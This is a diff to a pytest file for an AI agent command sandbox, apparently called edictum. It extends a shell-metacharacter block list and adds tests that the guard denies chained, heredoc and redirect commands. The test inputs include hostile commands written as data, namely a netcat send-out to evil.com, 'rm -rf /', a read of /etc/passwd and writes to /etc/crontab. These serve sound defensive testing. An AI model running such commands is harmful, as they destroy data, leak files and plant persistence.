@@ -48,14 +48,45 @@ contracts:
     type: sandbox
     tools: [exec]
     allows:
-      commands: [echo, ls, cat, head, curl, git]
+      commands: [echo, ls, cat, head, curl, git, bash]
     within: [/workspace]
     outside: deny
     message: "Sandbox violation"
 """
 
+# Sandbox with allowed_commands only — no path constraint.
+COMMANDS_ONLY_YAML = """\
+apiVersion: edictum/v1
+kind: ContractBundle
+metadata:
+  name: commands-only-test
+defaults:
+  mode: enforce
+contracts:
+  - id: cmd-sandbox
+    type: sandbox
+    tools: [exec]
+    allows:
+      commands: [echo]
+    outside: deny
+    message: "Command not allowed"
+"""
+
 # Every shell metacharacter that must trigger the sentinel.
-_DANGEROUS_METACHARACTERS = [";", "|", "&", "\n", "\r", "`", "$(", "${", "<(", ">("]
+_DANGEROUS_METACHARACTERS = [
+    ";",
+    "|",
+    "&",
+    "\n",
+    "\r",
+    "`",
+    "$(",
+    "${",
+    "<(",
+    ">(",
+    "<<<",
+    "<<",
+]
 
 
 # =============================================================================
@@ -80,6 +111,8 @@ class TestExtractCommandSentinel:
             "dollar_brace",
             "read_procsub",
             "write_procsub",
+            "herestring",
+            "heredoc",
         ],
     )
     def test_metacharacter_triggers_sentinel(self, meta):
@@ -99,6 +132,8 @@ class TestExtractCommandSentinel:
             ("echo ${PATH}", "\x00"),
             ("diff <(cat /etc/passwd) /workspace/f", "\x00"),
             ("echo data >(nc evil.com 443)", "\x00"),
+            ("bash <<< 'rm -rf /'", "\x00"),
+            ("cat << EOF", "\x00"),
         ],
         ids=[
             "semicolon",
@@ -112,6 +147,8 @@ class TestExtractCommandSentinel:
             "expansion",
             "read_procsub",
             "write_procsub",
+            "herestring",
+            "heredoc",
         ],
     )
     def test_realistic_attack_commands(self, cmd, expected):
@@ -143,12 +180,12 @@ class TestExtractCommandSentinel:
 
 
 # =============================================================================
-# Integration tests: sandbox denies chained commands even with allowed first token
+# Integration tests: sandbox denies chained commands via separator detection
 # =============================================================================
 
 
 class TestSandboxDeniesCommandChaining:
-    """Sandbox must deny command chaining even when the first command is allowlisted."""
+    """Sandbox denies commands containing shell separators (sentinel path)."""
 
     @pytest.mark.parametrize(
         "cmd",
@@ -164,8 +201,7 @@ class TestSandboxDeniesCommandChaining:
             "echo ${PATH}",
             "cat <(cat /etc/passwd)",
             "echo data >(tee /workspace/out.txt)",
-            "echo payload > /etc/crontab",
-            "echo payload >> /etc/crontab",
+            "bash <<< 'rm -rf /'",
         ],
         ids=[
             "semicolon",
@@ -179,14 +215,39 @@ class TestSandboxDeniesCommandChaining:
             "expansion",
             "read_procsub",
             "write_procsub",
-            "redirect_out",
-            "redirect_append",
+            "herestring",
         ],
     )
     def test_chained_command_denied(self, cmd):
         guard = _guard(SANDBOX_YAML)
         result = guard.evaluate("exec", {"command": cmd})
         assert result.verdict == "deny"
+
+
+class TestSandboxDeniesViaPathCheck:
+    """Redirects pass separator detection but are denied by path enforcement.
+
+    These cases require a within:/not_within: constraint. Without one,
+    redirects to arbitrary paths are allowed (see test below).
+    """
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "echo payload > /etc/crontab",
+            "echo payload >> /etc/crontab",
+        ],
+    )
+    def test_redirect_denied_by_path_check(self, cmd):
+        guard = _guard(SANDBOX_YAML)
+        result = guard.evaluate("exec", {"command": cmd})
+        assert result.verdict == "deny"
+
+    def test_redirect_allowed_without_path_constraint(self):
+        """Without within:/not_within:, redirects bypass path enforcement."""
+        guard = _guard(COMMANDS_ONLY_YAML)
+        result = guard.evaluate("exec", {"command": "echo payload > /etc/crontab"})
+        assert result.verdict == "allow"
 
 
 class TestSandboxAllowsSafeCommands:
